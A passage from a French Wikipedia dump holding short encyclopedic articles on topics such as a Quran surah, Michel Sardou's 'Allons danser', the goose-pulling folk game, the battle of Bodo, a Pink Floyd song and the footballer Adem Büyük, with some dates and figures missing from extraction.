Au Monastère Saint-Boris-et-Saint-Gleb (Borissoglebski) il fit adjoindre une église, un beffroi, des décorations de portes et du réfectoire en 1680.
Beaucoup d'édifices sont garnis de fresques. Dans le Kremlin de Rostov, Jonas Syssoïevitch fait même planter un Jardin suspendu qui a disparu.
Il fait également construire le carillon de la Cathédrale de la Dormition (Rostov) dont la cloche la plus grosse est appelée « Sysoe » en l'honneur de son père. Ces églises et monastères sont aussi de véritables forteresses monastiques, des citadelles de la foi orthodoxe. Elles sont hérissées de tours de garde, de courtines.
Beaucoup de ces bâtiments sont caractérisés par l'union de l'architecture religieuse avec l'architecture civile et militaire. Cela imprime à ces édifices une puissante originalité.

</doc>
<doc id="8732616" url="https://fr.wikipedia.org/wiki?curid=8732616" title="Ach-Chu'ara">
Ach-Chu'ara

Ach-Chu'ara (arabe : , français : "Les poètes") est le nom traditionnellement donné à la sourate du Coran, le livre sacré de l'islam. Elle comporte 227 versets. Rédigée en arabe comme l'ensemble de l'œuvre religieuse, elle fut proclamée, selon la tradition musulmane, durant la période mecquoise.
Origine du nom.
Bien que le titre ne fasse pas directement partie du texte coranique, la tradition musulmane a donné comme nom à cette sourate "Les poètes", mentionnés dans le verset 224.
D'après le Coran, les poètes de la tribu de Quraych utilisaient leur art pour s'opposer à la nouvelle religion ().
Historique.
Il n'existe à ce jour pas de sources ou documents historiques permettant de s'assurer de l'ordre chronologique des sourates du Coran. Néanmoins selon une chronologie musulmane attribuée à Ǧaʿfar al-Ṣādiq (VIIIe siècle) et largement diffusée en 1924 sous l’autorité d’al-Azhar, cette sourate occupe la place. Elle aurait été proclamée pendant la période mecquoise, c'est-à-dire schématiquement durant la première partie de l'histoire de Mahomet avant de quitter La Mecque. Contestée dès le XIXe par des recherches universitaires, cette chronologie a été revue par Nöldeke, pour qui cette sourate est la 56e.
Les différences stylistiques et thématiques entre les deux parties constituant cette sourate ont permis de supposer l'existence de périodes d'élaboration différentes des éléments du texte. Pour Bell, la deuxième partie est postérieure et a connu, comme la première, une réécriture avec des révisions. Neuwirth, quant à elle, distingue trois parties.
Interprétations.
Verset 105–122 : Le déluge.
S’intéressant au contre-discours de ce passage, Azaiez remarque la proximité entre les propos de Noé et ceux de Mahomet dans la sourate 7 (v.188). Pour Ben Taïbi, « on peut établir un parallélisme entre dialogues dans le passé et dialogues dans le présent, qui montre que les seconds se construisent en procédant à l’anaphorisation des données des premiers ».
Grodzki remarque que le dialogue entre Noé et les non-croyants évoque un événement connu de tous et non détaillé dans la sourate. Noé est présenté comme « prophète des « al-ardalūna », que Hawting traduit par « faibles ». Cette idée se retrouve dans la Sîra (biographie) de Mahomet. Cela évoque pour Tengour « la condition basse des partisans ("muhâjirûn") mekkois de Muḥammad et même de Muḥammad lui-même qui n’avait pas le statut que la tradition lui prêtera plus tard. ».
Pour Tengour, ce passage appartient au thème de la dénégation, qui est d’abord associé à la tribu de Quraish refusant le message de Mahomet.

</doc>
<doc id="8732617" url="https://fr.wikipedia.org/wiki?curid=8732617" title="Allons danser">
Allons danser

Allons danser est une chanson écrite et interprétée par Michel Sardou, parue sur l'album "Hors format" en 2006 et sortie en single le . Elle est composée par Jacques Veneruso, et ouvre le tour de chant sur l'album live "Zénith 2007" ; on peut d'ailleurs voir sur ce morceau, pour la première fois de sa carrière, Michel Sardou jouer de la guitare sur scène.
Autour de la chanson.
Polémiques.
Le texte de la chanson évoque certains débats sociaux qui traversent la France. En raison de plusieurs commentaires du chanteur exprimés dans le titre (« Se prendre en charge, et pas charger l'État » ; « D'où que tu viennes, bienvenue chez moi, en sachant qu'il faut respecter ceux qui sont venus longtemps avant toi » ; « Dire aux enfants qu'on va changer l'éducation qu'ils ont par celle qu'ils n'ont pas »...), certains observateurs, comme "Le Nouvel Observateur", ont estimé qu'il s'agissait, à quelques mois de l'élection présidentielle de 2007, d'un titre promotionnel pour la campagne du candidat UMP Nicolas Sarkozy, d'autant plus que les paroles de la chanson sont apparues sur la quatrième de couverture de l'édition du journal "Le Parisien" du .
Réaction de Sardou.
Dans le film documentaire de Mireille Dumas "Qui êtes-vous Michel Sardou ?" diffusé sur France 3 en septembre 2012, Sardou déplore la polémique qui a découlé de cette chanson, commentant de manière ironique « J'ai encore réussi mon coup », et affirmant avoir seulement appelé à ne plus écouter les hommes politiques pour aller danser loin de leurs discussions.

</doc>
<doc id="8732622" url="https://fr.wikipedia.org/wiki?curid=8732622" title="Sarah Cruddas">
Sarah Cruddas

Sarah Cruddas (née le au Pays de Galles) est une journaliste, physicienne et animatrice de télévision anglaise.
Jeunesse et formation.
Cruddas grandit dans le East Yorkshire. Elle fréquente la ', puis le ' de Hull, où elle obtient une formation en mathématiques, physique et chimie. Elle remporte le prix "" 2000 et participe au "Space Camp" de la NASA.
Elle obtient un baccalauréat universitaire en physique avec une spécialité en astrophysique de l'université de Leicester et un diplôme d'études supérieures en journalisme de grande diffusion de l'université de Westminster.
Carrière.
Cruddas commence sa carrière comme journaliste à ' et ', puis à "BBC Radio 1Xtra" et "Talksport".
En , elle présente la météorologie à l'émission "Look North" de la "BBC" ainsi qu'à des radio locales telles ", , , et ". À la même époque, elle développe des émissions à contenus scientifiques pour BBC 4 et BBC 2 et travaille comme journaliste scientifique pour "Five Live".
En , elle quitte ' pour travailler comme correspondante scientifique basée à Salford pour '. Cruddas fait également des reportages pour "BBC News" et présente des films pour "BBC Learning". 
Après avoir quitté la "BBC" à l'été 2012, elle travaille comme animatrice et journaliste indépendante. Elle fait des apparitions à "Sky News", "Channel 5 News" et "ITV" ainsi qu'à "BBC News", "Channel 4 News" et "Horizons Business" sur "BBC World". 
Elle a également été animatrice à "BBC Radio 4" et a travaillé comme journaliste pour "BBC World Service Radio" ainsi que "BBC GNS". Elle a aussi écrit pour le "The Sunday Times", "New Scientist", "BBC Futures", "Sky at Night Magazine", "BBC Online", "BBC Focus", "Grazia magazine" et "Science Uncovered".
Cruddas a également travaillé comme journaliste à l'étranger, couvrant des pays tels l'Australie, l'Arctique, la Chine, la Corée du Nord et le Tibet.

</doc>
<doc id="8732634" url="https://fr.wikipedia.org/wiki?curid=8732634" title="Batterie Sainte-Marthe">
Batterie Sainte-Marthe

La batterie Sainte-Marthe est une ancienne batterie militaire du faisant partie du système défensif de la ville de Saint-Pierre en Martinique. Elle est située à l'extrémité occidentale du Morne d'Orange dans le quartier du Mouillage.
Histoire.
La batterie Sainte-Marthe est l'une des plus anciennes batterie de la Martinique, construite entre 1685 et 1693. Elle est baptisée en l'honneur d'Antoine-André de Sainte-Marthe de Lalande, chevalier de Sainte-Marthe, gouverneur particulier de la Martinique de 1670 à 1679. 
Avec la batterie Saint-Louis au nord, à l'embouchure de la rivière des Pères, le Fort Saint-Pierre au centre, et la batterie Saint-Charles au sud, sur le Morne d'Orange, l'implantation de la batterie Sainte-Marthe sur le flanc du même morne constitue le point le plus méridional du système défensif de la rade et de la ville de Saint-Pierre, le Morne d'Orange marquant la limite sud de la ville. C'est ce que confirme Jean-Baptiste Du Tertre dans son "Histoire générale des Antilles habitées par les François" lorsqu'il écrit au sujet du Morne d'Orange: . 
La batterie Sainte-Marthe ne subit pas de transformations importantes jusqu'à l'éruption du 8 mai 1902. La poudrière remarquablement conservée a été construite postérieurement à 1864.
Le sol de la batterie, le sous-sol et les vestiges visibles ont été inscrits à l'inventaire supplémentaire des monuments historiques par arrêté du .
Description.
La batterie Sainte-Marthe constitue un petit fortin dominant la ville et occupé par des vestiges de bâtiments militaires. Son plan est resté inchangé jusqu'à l'éruption de 1902. 
À l'intérieur, des bâtiments annexes, tels que logement du gardien, cuisine, et magasin de matériel, ont connu plusieurs états. Il subsiste aujourd'hui deux pans de murs ayant appartenu à l'un d'eux. La poudrière voûtée est remarquable, de plan rectangulaire parfaitement conservée. 
À l'extérieur, au nord-est, subsiste encore un bassin rectangulaire qui était alimenté par le premier canal construit en 1821 pour le Morne d'Orange.

</doc>
<doc id="8732636" url="https://fr.wikipedia.org/wiki?curid=8732636" title="Hôpital des armées René le Bas">
Hôpital des armées René le Bas



</doc>
<doc id="8732650" url="https://fr.wikipedia.org/wiki?curid=8732650" title="Enerca">
Enerca

Enerca, "Energie Centrafricaine" est l’entreprise publique de production, transport et distribution de l’électricité de la République centrafricaine. Elle est créée en 1963.
Production.
Enerca gère les deux plus importantes centrales de production d’électricité hydraulique du pays que sont Boali 1 et 2. Elles alimentent la ville de Bangui et totalisent 18,65 MW de puissance installée. Douze villes de province sont électrifiées grâce à des centrales thermiques dont le fonctionnement dépend de l’approvisionnement en carburant.
Statut.
Les politiques d’ajustements structurels promues par la Banque mondiale ont placé le secteur de l’éléctricité dans un objectif de libéralisation depuis 1998. L’Enerca n’a plus le monopole de production et distribution de l’éléctricité en Centrafrique depuis décembre 2004.

</doc>
<doc id="8732656" url="https://fr.wikipedia.org/wiki?curid=8732656" title="One Moment in Time">
One Moment in Time

 est une chanson de Whitney Houston pour les Jeux olympiques et paralympiques d'été de 1988 à Séoul en Corée du Sud, écrite par Albert Hammond et John Bettis et produite par Narada Michael Walden. La chanson a atteint au cinquième rang du Billboard Hot 100 aux États-Unis, et au premier du UK Singles Chart au Royaume-Uni.
Elle est entrée en dans le Top Singles France du et sortie en , le .

</doc>
<doc id="8732688" url="https://fr.wikipedia.org/wiki?curid=8732688" title="Jeu de l'oie (folklore)">
Jeu de l'oie (folklore)

Dans le folklore européen, le jeu de l’oie, également nommé jeu du cou de l'oie et tir à l'oie, est une ancienne activité sportive populaire qui consiste à arracher la tête d'une oie tout en étant juché sur le dos d'un cheval. Les règles de cette pratique diffèrent selon les époques et les régions et nécessitent souvent une belle adresse. Issu de l'Espagne du , ce jeu s'est progressivement diffusé en Europe occidentale et a suivi les colons néerlandais jusqu'en Amérique du Nord. Elle perd en popularité à partir du milieu du et du début du , l'utilisation d'oies vivantes étant progressivement interdite, mais elle parvient à se perpétuer dans certaines régions rurales jusqu'au en ne provoquant plus de souffrance animale. En ce début de millénaire, cette pratique provoque des tensions idéologiques entre tenants des traditions et militants de la cause animale, les oies mortes étant parfois remplacées sous la pression par des animaux factices.
Généralités.
Le tir à l'oie fait partie des sports animaliers populaires dans lesquels les gens s'affrontent en torturant des animaux, comme le Fastelavn au nord de l'Europe où, traditionnellement, un chat noir est frappé dans un bidon et le tir à l'anguille ("palingtrekken") néerlandais où des anguilles sont disputées. À l'inverse du combat de chiens ou de la tauromachie qui sont des sports de spectateurs, le tir à l'oie est un sport de participants. Comme tous les sports animaliers où l'animal vivant est torturé, à l'exception de la tauromachie, le tir à l'oie a progressivement disparu de la scène publique et se maintient localement sous des formes ne provoquant plus de souffrance animale, l'utilisation d'oies vivantes ayant été partout interdite au début du .
Le tir à l’oie a vu le jour au en Espagne. Il se diffuse progressivement en Europe occidentale en France, en Suisse, en Belgique, aux Pays-bas et en Allemagne. Ce sport n'étant pas populaire en Grande Bretagne, ce sont les migrants néerlandais qui le transmettent aux colons américains anglophones.
L’oie est la plupart du temps pendue par les pattes en hauteur sur un fil tendu tendu entre deux piliers ou en travers d'une rue. Chaque compétiteur joue à tour de rôle. Le gagnant est le joueur, généralement juché sur un cheval, qui parvient à arracher la tête de l’animal soit à main nue, soit à l’aide d’un bâton, d’un sabre plus ou moins émoussé voire d’un pistolet. Les variantes locales sont nombreuses. Des poules, canards et lapins peuvent être substitués à l'oie, tout comme un objet factice. Certaines règles rajoutent des difficultés : ainsi, le cou de l'animal peut être huilé ou savonné, les joueurs peuvent avoir les yeux bandés ou encore un coup de fouet peut être donné au cheval pour destabiliser le participant.
Charles Grandison Parsons décrit le déroulement d'un de ces concours qui s'est tenu à Milledgeville, en Géorgie aux USA, dans les années :
Particularités locales.
Espagne.
En Espagne, au , ce sport consiste alors à attacher une oie vivante, dont la tête est bien graissée, à une corde tendu en travers d'une route. Un homme à cheval au grand galop tente de saisir l'oiseau par le cou pour lui arracher la tête
Au , l'utilisation d'oies est interdite sous le régime dictatorial de Franco par une loi sur la protection des animaux. À la place des oies, sont par exemple utilisés des rubans attachés à des bâtons, que les cavaliers doivent insérer dans des anneaux métalliques. Lorsque le régime tombe, l'utilisation des oies est de nouveau autorisée.
Au , au Pays basque, le tir à l'oie n'est pratiqué qu'avec des oies mortes pendant la Journée des oies du festival de San Antolín dans la ville de pêcheurs basque de Lekeitio. L'oie est suspendue au-dessus de l'eau tandis que les concurrents passent en dessous en bateau. La ville d'El Carpio de Tajo, dans le centre de l'Espagne, pratique aussi le tir à l'oie chaque en célébration de la Reconquista de .
Dans un débat proche de l'opposition à la corrida, cette pratique est sujette à l'opposition entre les tenants de la tradition et ceux du bien-être animal.
Belgique.
En Belgique, le tir à l'oie se pratique depuis au moins le . En , le village wallon de Bossière organise le jeu par la suspension d’une oie à une corde tendue entre deux perches. Des hommes du lieu et des villages voisins tous montés à cheval tentent de décrocher la tête. Celui qui la remporte reçoit un prix et est reçu au frais de la collectivité locale.
L'utilisation d'oies vivantes est interdite à partir des années . Depuis, elles sont au préalable tuées sans douleur par un vétérinaire avant le jeu, puis enveloppées dans un filet pour dissimuler sa forme au public. Le jeu de l'oie belge s'accompagne d'un ensemble de coutumes élaborées. Le jeu peut par exemple débuter par un procès fictif au cours duquel l’oie est condamnée. Le cavalier qui réussit à arracher la tête de l'oie est parfois couronné et couvert d'un manteau en tant que roi du village pour un an. À la fin de son année royale, le roi en titre doit offrir à ses sujets du village un festin de bière, de boissons, de cigares et de boudin ou de saucisses, organisé soit à son domicile, soit dans un bar. Chaque année, les rois des villages de la région s'affrontent pour devenir empereur. Les enfants peuvent aussi participer et gagner des lots.
En Flandre, dans les années , les participants sont sociologiquement plutôt des hommes âgés appartenant à la classe inférieure, mais contrairement aux "a priori", ils sont issus d'un environnement urbain plutôt que du milieu rural.
France.
À Paris, au , les jeunes gens de la paroisse de la Villette et du faubourg Saint-Laurent jouaient à tirer l'oie au bâton en 1726.
Ce jeu se pratique toujours au en Auvergne, par exemple à Arfeuilles dans le département de l'Allier, lors de la fête patronale du , mais aussi en Haute-Loire et dans le Puy de Dôme durant les années et lors de certaines fêtes patronales et de classards. L'oie, de nos jours préalablement tuée, est pendue par les pattes en hauteur. En équilibre sur un cheval, les participants doivent à tour de rôle tirer sur la tête de l'animal à main nue ou la frapper avec un bâton jusqu'à ce qu'il soit décapité, envoyant leur trophée sur le public. Les animaux sont ensuite cuisinés et partagés par les festoyeurs autour d'un banquet. C'est également le cas dans le Rhône à Brindas et Saint-Vérand dans les années 2010 où les cavaliers doivent parcourir un passage parsemé d'obstacles avant de pouvoir tenter de passer une petite baguette de bois dans un anneau placé dans le bec de l'oie suspendue, le tout en évitant de tomber dans une piscine ou dans des bottes de paille.
Au yeux des participants et des organisateurs, en plus d'être une tradition culturelle, cette animation permet de donner de la vie dans le village tout en reliant toutes les tranches d'âges. Bien que la pratique du tir à l'oie soit légale en France si l'animal a préalablement été tué, elle suscite parfois l'indignation et le mépris des défenseurs de la cause animale qui lui reprochent sa cruauté gratuite. Cette pratique est parfois remplacée par une course de garçons de café.
Suisse.
À la fin du , dans la ville suisse de Sursee, canton de Lucerne, on pratique le jeu de la décapitation de l'Oie le , jour de la Saint-Martin. Une oie morte est suspendue au milieu de la place communale, les compétiteurs, en ordre essayent de lui trancher le cou avec un sabre
Pays-Bas.
La pratique du tir à l'oie est attestée aux Pays-Bas dès le début du ; le poète Gerbrand Adriaensz Bredero y fait référence dans son poème nommé "Boerengeselschap" (Compagnie de paysans) de , décrivant comment un groupe de paysans se rend à un concours de tir à l'oie près d'Amsterdam se terminant en bagarre brutale. Il en conclut qu'il est préférable pour les citadins de rester à l'écart des plaisirs paysans.
Dans ce pays, l'utilisation d'oies vivantes a été interdite dans les années 1920. Cependant, cette pratique suscite toujours une certaine controverse alors que seul des animaux morts sont utilisés. Ainsi, en 2008, le Parti néerlandais pour les animaux (PvdD) propose d'interdire cette tradition dans le dernier village de Grevenbicht, ce que les organisateurs rejettent. En 2019, le tir à l'oie avec des animaux morts est interdit et se pratique désormais avec des oies factices.
Allemagne.
Cette tradition aurait été importée en Allemagne par les soldats espagnols stationnés en et pendant la guerre de Quatre-Vingts Ans et plus tard pendant la guerre de Trente Ans.
Aux , la situation générale du pays est disparate. Des jeux de l'oie se déroulent avec des oies mortes comme à Velbert et Langenhorst ; d'autres avec des oies factices en caoutchouc comme à Höntrop et Sevinghausen à la suite d'une pétition mais aussi à Dortmund et Essen alors que l'activité est complètement interdite à Werl dès .
Les citoyens engagés dans le droit animal considèrent que l'utilisation d'une oie morte enfreint la loi sur la protection des animaux et constitue une glorification de la violence. Cependant, en , le tribunal administratif de Gelsenkirchen a décidé qu'une interdiction de mise à mort n'entrait pas en ligne de compte tant que l'oie tuée était consommée.
Grande-Bretagne.
Le jeu de l'oie n'a jamais été répandu en Grande-Bretagne, les ethnologues du milieu du en parlant comme d'une pratique exotique ou ancienne.
États-Unis.
Les colons néerlandais importent le jeu de l'oie en Nouvelle-Néerlande dont la capitale deviendra New-York et le diffusent aux colons anglophones issus des classes sociales populaires. Dans le sud du pays, avant la guerre de Sécession, esclaves et Blancs s'affrontent dans des concours de tir à l'oie. Les prix reçus par le vainqueur sont la plupart du temps insignifiants : souvent l'oiseau mort lui-même, d'autres fois des tournées de boissons alcoolisées. Le principal attrait de ces concours pour les participants sont de prouver leur valeur morale et physique alors que pour les spectateurs, il réside essentiellement dans les paris sur les concurrents, parfois pour de l'argent, le plus souvent pour des boissons.
Cette activité sportive populaire est mal vue par les élites qui la qualifient par exemple de selon une ordonnance du directeur général de Nouvelle-Amsterdam en , ou d' en ou encore de en .
À quelques rares exceptions près, la pratique du tir à l'oie est inexistante après la guerre de Sécession dans les années .

</doc>
<doc id="8732715" url="https://fr.wikipedia.org/wiki?curid=8732715" title="Bataille de Bodo">
Bataille de Bodo

La bataille de Bodo a lieu à Bodo, village camerounais situé à de Fotokol les 29 et pendant l'insurrection de Boko Haram. Elle oppose les forces de Boko Haram et l'armée tchadienne.
Prélude.
Le , à Ndjamena, à la suite d'une rencontre entre le ministre camerounais de la Défense et le président du Tchad Idriss Déby, le gouvernement tchadien annonce apporter un soutien actif au Cameroun dans le conflit contre les djihadistes de Boko Haram. Le , les troupes tchadiennes entrent au Cameroun et le 28 une partie de leurs forces se déploie à Fotokol, une ville frontalière séparée par un pont de 500 mètres de la ville nigériane de Gamboru Ngala.
Déroulement.
Le , les forces de Boko Haram tentent une nouvelle incursion au Cameroun et lancent un assaut sur la localité de Bodo, près de Fotokol. Ils se heurtent pour la première fois aux troupes de l'armée tchadienne. Le combat s'engage vers 16 heures mais les djihadistes sont repoussés et se replient. Ils lancent cependant une seconde attaque le lendemain en engageant le combat par des tirs de roquettes. Des échanges de tirs suivent et durent plusieurs heures, mais les Tchadiens repoussent à nouveau les assaillants qui regagnent Gamboru Ngala.
Les pertes.
Selon l'état-major tchadien, le bilan des combats est de 123 morts pour les djihadistes, contre trois tués et douze blessés pour l'armée tchadienne. L'état-major précise que les trois militaires tués ont été victimes d'engins explosifs de fabrication artisanale. L'hôpital militaire de N'Djamena indique cependant qu'un des soldats blessés décède le 31. Deux civils sont également tués le 28 et le 29 à Fotokol, par des roquettes tirées depuis le Nigeria.

</doc>
<doc id="8732731" url="https://fr.wikipedia.org/wiki?curid=8732731" title="Triptyque de Cambridge">
Triptyque de Cambridge

Le Triptyque de Cambridge (représentant Saint Géminien de Modène, saint Michel et saint Augustin) est un triptyque peint en tempera, argent et or sur panneau de bois, datant de 1319, réalisé par le peintre de l'école siennoise Simone Martini, et conservé au Fitzwilliam Museum de Cambridge.
Histoire.
Le polyptyque destiné à l'église Sant' Agostino de San Gimignano fut peint en 1319 (ou 1320-1325 pour Giorgio Vasari) et il comportait probablement une Vierge à l'Enfant au centre et d'autres panneaux consacrés à des saints.
Recomposé pour le musée de Cambridge, ce triptyque est composé de trois panneaux de surmontés de pinacles, et qui comportent au dos des deux panneaux latéraux des inscriptions à propos du nom des saints évêques représentés (), ne laissant aucun doute sur leur identité.
Description.
Les saints Géminien de Modène, Michel archange et Augustin d'Hippone, portant la crosse épiscopale pour les évêques, l'épée et la pesée des âmes pour l'archange, se côtoient dans leurs panneaux, chacun surmonté d'un pinacle avec un ange.

</doc>
<doc id="8732767" url="https://fr.wikipedia.org/wiki?curid=8732767" title="Antonio del Castillo y Saavedra">
Antonio del Castillo y Saavedra

Antonio del Castillo y Saavedra (Cordoue, -Cordoue, ) est un peintre baroque espagnol du siècle d'or.
Biographie.
Fils du peintre Agustín del Castillo, élève de Zurbaran, une grande partie de ses œuvres peut être vue dans les églises de Cordoue. D'après la légende il serait mort de chagrin à la découverte des toiles de Murillo.

</doc>
<doc id="8732787" url="https://fr.wikipedia.org/wiki?curid=8732787" title="Jour de carence">
Jour de carence



</doc>
<doc id="8732792" url="https://fr.wikipedia.org/wiki?curid=8732792" title="Jules Lunteschütz">
Jules Lunteschütz

Jules Lunteschütz, né Isaak Lunteschütz le à Romanswiller et mort le à Francfort-sur-le-Main est un peintre franco-allemand.
Biographie.
Isaak Lunteschütz est né le à Romanswiller en Alsace, de Jonas Lunsteschutz (1786-1843), rabbin, et Frederika Schuster. Ses parents ont neuf enfants parmi lesquels quatre fils survivent ; à côté d'un horloger et d'un employé du chemin de fer, on trouve deux peintres : Isaak et Joseph (né en 1829) souvent confondus en raison des variations de prénoms. Isaak, dit Jules, vit son enfance dans le quartier Battant de Besançon, où il suit les cours de l'école de dessin. Il est ensuite élève de Jean Alaux à Paris en 1843 et de Philipp Veit à Francfort vers 1845. 
Il expose à Paris au Salon de 1851 à 1867, et est nommé chevalier de la Légion d'honneur en 1866. Il est surtout connu grâce à un portrait très expressif du philosophe Arthur Schopenhauer âgé, avec qui il est uni par un lien d'amitié. Jules Lunteschütz rencontre Gustave Courbet à Francfort en 1858, lequel réalise son portrait conservé à Francfort au musée Städel.
Même s'il vit à Francfort, il opte pour la nationalité française en 1872.

</doc>
<doc id="8732806" url="https://fr.wikipedia.org/wiki?curid=8732806" title="Louder than Words (chanson de Pink Floyd)">
Louder than Words (chanson de Pink Floyd)

Tirée du disque ', est une chanson composée par David Gilmour et sa conjointe, la romancière et journaliste Polly Samson. C'est la seule chanson de cette collection de pièces, majoritairement enregistrées à l'époque des séances de ', tout le reste de l'album étant instrumental. L'album en lui-même est un hommage à Rick Wright, le claviériste du groupe décédé en 2008.
Cette chanson clôt l'album ', ainsi que l'aventure musicale de Pink Floyd. Par contre, David Gilmour utilisera la notoriété de son groupe afin de lever des fonds pour l'Ukraine assiégée avec une nouvelle chanson inédite en intitulée '.
Historique.
L'idée pour les paroles, écrites en grande partie par Polly Samson la femme de Gilmour, est survenue pendant l’événement du Live 8 en , lors de la première réunion de Pink Floyd avec Roger Waters en 24 ans. Dans les loges après le test de son et la répétition, elle remarque que le groupe ne se parle pas mais que la communication passe lorsqu'ils jouent leur musique. Les paroles décrivent cette entente entre les membres à travers la musique, sans forcément avoir une communication réelle, un thème récurrent dans la discographie du groupe (voir les albums "The Dark Side of the Moon" ou "The Wall"). Ce sera la dernière fois que les quatre musiciens se retrouveront ensemble sur scène.
La base instrumentale provient des séances de l'album "" enregistré aux studios Britannia Row à Londres en . Elle est ensuite retravaillée à partir de sur l'Astoria, la péniche de David Gilmour, et dans les studios Olympic et Medina pour être incluse dans le dernier album du groupe. C'est à ce moment qu'il est décidé d'écrire des paroles, bien qu'originellement tout l'album se devait de n'être composé que de pièces instrumentales.
Composition.
La musique accompagnant la chanson, composée par David Gilmour, est décrite par divers critiques musicaux et écrivains, dont "Exclaim!" par l'écrivain Josiah Hughes comme "un morceau mélodramatique à combustion lente complet avec beaucoup de travail intense de guitare et de synthétiseur" et par l'écrivain de "Clash" Robin Murray comme un "morceau clairsemé et trippant, riche en atmosphère de guitare et en production électronique sombre". Les paroles, écrites par l'épouse de Gilmour, Polly Samson, fournissent « une représentation majestueuse de l'amour éternel, un hommage à Richard Wright et l'importance de surmonter les petites différences ». Gilmour a parlé de la chanson avec "The Guardian", déclarant :
Gilmour et Mason reviendront sur cette décision en 2022, en sortant le single "Hey, Hey, Rise Up", au profit de l'aide humanitaire lors de l'invasion russe de l'Ukraine.
Paroles.
Les paroles de "Louder than Words" sont écrites par l'épouse de David Gilmour, Polly Samson. Elle se base sur des observations du comportement du groupe pendant les répétitions, les temps d'arrêt et la performance au Live 8 en juillet 2005, la première réunion du groupe sous le nom de Pink Floyd avec Roger Waters depuis plus de 24 ans.
Clip musical.
La majorité du clip de "Louder than Words" est tournée au Kazakhstan, sur ce qui était autrefois la mer d'Aral. Le réalisateur Po Powell a déclaré à Rolling Stone que le paysage aride qui abritait autrefois l'un des quatre plus grands lacs intérieurs du monde était désormais « une image surréaliste si jamais j'en ai vu une… un exemple choquant de mauvaise gestion humaine et l'une des pires catastrophes environnementales de la planète. ... La mer a rétréci à 10 pour cent de sa taille originale, détruisant l'industrie de la pêche et des villages entiers. » Comme la catastrophe est assez connue, Powell a essayé de se concentrer sur ce qu'elle signifie pour une jeune génération grandissant sans les influences de pêche et maritimes de leurs ancêtres. En revanche, l'ouverture du clip vidéo présente un homme pagayant à travers les nuages (évoquant la couverture de l'album) et des images de Gilmour, Wright et du batteur de Pink Floyd, Nick Mason, pendant les sessions de The Division Bell, avec des images contemporaines de Gilmour chantant dans son studio de Medina.
Parution et réception.
"Louder than Words" a reçu des critiques généralement positives de la part des critiques musicaux. Tom Breihan du webzine musical Spin Media Stereogum a écrit positivement à propos de la chanson, déclarant que "la chanson est un chef-doeuvre, une élégie de rock progressif lent avec un chœur gospel et une guitare Floyd classique". Brad Bershad de Zumic a également donné une critique positive à la chanson. "Les parties de guitare de Gilmour sont excellentes, bien que peut-être plus douces que le ton classique et irrégulier des disques des années 70", a-t-il déclaré. "Le temps a un peu adouci les Floyd, mais c'est toujours une belle chanson. Les paroles autobiographiques, faisant référence à la puissance derrière la musique et les luttes intestines de Pink Floyd, sont excellentes." La chanson a atteint le numéro 1 du classement de la radio polonaise 3 le 24 octobre.
Personnel.
D'après les crédits de l'album "The Endless River".
Voir aussi.
"Hey Hey Rise Up" : Chanson publiée en 2022

</doc>
<doc id="8732810" url="https://fr.wikipedia.org/wiki?curid=8732810" title="Zappos">
Zappos

Zappos est une entreprise de vente de chaussures par Internet dirigée par Tony Hsieh jusqu'à sa mort en 2020, filiale d'Amazon et implantée à Las Vegas.
La société a été achetée par Amazon en 2009 pour 1,2 milliard de dollars.

</doc>
<doc id="8732813" url="https://fr.wikipedia.org/wiki?curid=8732813" title="Kanie (Mazovie)">
Kanie (Mazovie)

Kanie (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres à l'est de Brwinów (siège de la "gmina"), 5 kilomètres au sud-ouest de Pruszków (siège du "powiat") et à au sud-ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732820" url="https://fr.wikipedia.org/wiki?curid=8732820" title="Scott Gordon Jurek">
Scott Gordon Jurek



</doc>
<doc id="8732832" url="https://fr.wikipedia.org/wiki?curid=8732832" title="Kanie (homonymie)">
Kanie (homonymie)

Kanie peut désigner :
Toponymie.
au 
en Pologne

</doc>
<doc id="8732837" url="https://fr.wikipedia.org/wiki?curid=8732837" title="Kopana (Pruszków)">
Kopana (Pruszków)

Kopana (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres au sud de Brwinów (siège de la "gmina"), au sud-ouest de Pruszków (siège du "powiat") et à au sud-ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de en 2006.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732839" url="https://fr.wikipedia.org/wiki?curid=8732839" title="Adem Büyük">
Adem Büyük

Adem Büyük (né le à Hopa) est un footballeur international turc évoluant au Manisa FK.
Biographie.
En club.
Formé au Beşiktaş JK, il ne dispute aucun match en équipe première. En effet le joueur est prêté à divers clubs. C'est ainsi qu'au début de la saison 2005-2006 il est prêté au Zeytinburnu SK où il dispute 11 matchs et inscrit 2 buts. En janvier 2006, il est cette fois-ci prêté au Akçaabat Sebatspor jusqu'à la fin de la saison, mais son prêt sera par la suite prolongé pour une saison supplémentaire.
Il est ensuite prêté au Altay SK pour la saison 2007-2008. Le , il inscrit un quadruplé lors de la victoire 0-5 en déplacement de son équipe face à İstanbulspor.
Le , il est un des deux joueurs utilisé en contre partie dans le transfert d'Uğur İnceman au Beşiktaş JK. Le joueur s'engage au Manisaspor pour une durée de trois ans. Lors de la saison 2008-2009, il est un des joueurs qui permet à son club d'être promu en Süper lig.
Le , le joueur est prêté en division 2 au Boluspor.
Lors du mercato hivernal 2011, le joueur est prêté au Mersin İdman Yurdu.
Il dispute son premier match en Süper lig le , en entrant au jeu à la en remplacement de et ne peut empêcher Manisaspor de s'incliner sur le score de 2-1.
Lors du mercato hivernal 2012, il est transfèré au Kasımpaşa SK. Il dispute son premier match sous ses nouvelles couleurs le , à l'occasion d'une rencontre de Coupe de Turquie face à Ankaragücü. Kasımpaşa remporte la partie sur le score de 6-2 et Adem Büyük est l'auteur d'un triplé au cours de la rencontre. Le , il inscrit son premier but en Süper lig face à Mersin İdman Yurdu, qui voit les deux équipes se quitter sur le score de 2-2.
Le , le joueur s'engage gratuitement avec le Yeni Malatyaspor.
Le , Büyük signe librement au Galatasaray SK. Le transfert est effectif à partir du suivant.
